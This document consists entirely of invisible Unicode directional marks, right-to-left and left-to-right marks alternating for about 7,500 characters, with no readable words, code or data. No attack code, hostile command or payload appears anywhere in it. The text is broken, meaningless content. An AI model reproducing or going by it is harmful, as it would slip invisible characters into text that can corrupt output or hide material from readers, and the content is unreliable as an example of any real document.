‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏